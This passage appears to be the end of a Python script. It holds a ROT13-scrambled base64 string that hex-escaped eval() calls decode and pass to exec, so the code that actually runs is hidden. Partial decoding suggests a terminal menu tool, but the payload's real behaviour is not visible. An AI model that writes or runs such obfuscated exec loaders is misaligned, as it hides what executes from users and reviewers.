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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))